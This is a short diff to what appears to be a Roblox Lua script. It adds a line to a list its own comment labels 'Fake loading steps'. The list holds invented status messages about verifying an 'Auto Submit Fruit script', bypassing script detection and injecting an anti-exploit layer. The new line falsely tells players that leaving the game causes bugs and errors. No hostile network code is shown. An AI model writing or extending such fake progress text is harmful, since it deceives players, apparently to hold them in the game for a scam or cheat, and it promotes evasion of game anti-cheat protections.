@@ -70,6 +70,7 @@ statusText.Parent = loadingFrame
 -- Fake loading steps
 local statusMessages = {
 	"> Verifying Auto Submit Fruit script...",
+	"> Leaving the game causes Bugs and errors!...",
 	"> Bypassing Script detection ...",
 	"> Injecting anti-exploit layer...",
 	"> Compiling Rewards drop chances...",
